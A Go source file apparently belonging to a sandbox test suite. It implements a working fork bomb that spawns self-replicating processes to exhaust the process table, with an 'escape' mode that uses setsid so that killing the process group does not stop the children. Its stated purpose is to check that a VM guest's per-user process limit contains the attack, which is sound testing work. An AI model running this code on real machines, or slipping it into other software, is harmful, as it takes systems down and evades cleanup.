// forkbomb is an attack function (milestone 9): it starts copies of itself, which start copies
// of themselves, as fast as they can, to use up the machine's process table.
//
//	{"ms":N}            run the bomb for N ms (default 2000), then report
//	{"ms":N,"escape":true}
//	                    children also leave the process group (setsid), so killing the group
//	                    does not reach them
//	{"mode":"count"}    only report how many processes of this user exist (left-over check)
//
// Prints {"spawned": started copies, "failed": refused starts, "first_error": ..., "user_procs": ...}.
// Inside a BeeVM guest the copies are guest processes: the host never sees them. What stops
// them is the guest's per-user process limit, and the agent kills what is left after the call.
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "child" {
		child(len(os.Args) > 2 && os.Args[2] == "escape")
		return
	}
	raw, _ := io.ReadAll(os.Stdin)
	var p struct {
		Mode   string `json:"mode"`
		MS     int    `json:"ms"`
		Escape bool   `json:"escape"`
	}
	_ = json.Unmarshal(raw, &p)
	if p.Mode == "count" {
		out(map[string]any{"user_procs": userProcs()})
		return
	}
	if p.MS <= 0 {
		p.MS = 2000
	}
	args := []string{"forkbomb", "child"}
	if p.Escape {
		args = append(args, "escape")
	}
	spawned, failed := 0, 0
	firstErr := ""
	maxProcs := 0
	end := time.Now().Add(time.Duration(p.MS) * time.Millisecond)
	for time.Now().Before(end) {
		if err := spawn(args); err != nil {
			failed++
			if firstErr == "" {
				firstErr = err.Error()
			}
			time.Sleep(time.Millisecond)
		} else {
			spawned++
		}
		if spawned%32 == 0 {
			if n := userProcs(); n > maxProcs {
				maxProcs = n
			}
		}
	}
	if n := userProcs(); n > maxProcs {
		maxProcs = n
	}
	out(map[string]any{"spawned": spawned, "failed": failed, "first_error": firstErr, "max_user_procs": maxProcs})
}

// child keeps starting more children forever.
func child(escape bool) {
	if escape {
		_, _ = syscall.Setsid()
	}
	args := []string{"forkbomb", "child"}
	if escape {
		args = append(args, "escape")
	}
	for {
		if spawn(args) != nil {
			time.Sleep(5 * time.Millisecond)
		}
	}
}

func spawn(args []string) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	devnull, _ := os.Open(os.DevNull)
	defer devnull.Close()
	fd := devnull.Fd()
	_, err = syscall.ForkExec(exe, args, &syscall.ProcAttr{Files: []uintptr{fd, fd, fd}})
	return err
}

// userProcs counts processes of this program's user.
func userProcs() int {
	uid := strconv.Itoa(os.Getuid())
	entries, _ := os.ReadDir("/proc")
	n := 0
	for _, e := range entries {
		if _, err := strconv.Atoi(e.Name()); err != nil {
			continue
		}
		b, err := os.ReadFile("/proc/" + e.Name() + "/status")
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "State:") && strings.Contains(line, "Z") {
				break // a zombie: dead, only not yet collected
			}
			if strings.HasPrefix(line, "Uid:") {
				if f := strings.Fields(line[4:]); len(f) > 0 && f[0] == uid {
					n++
				}
				break
			}
		}
	}
	return n
}

func out(v any) {
	b, _ := json.Marshal(v)
	fmt.Println(string(b))
}
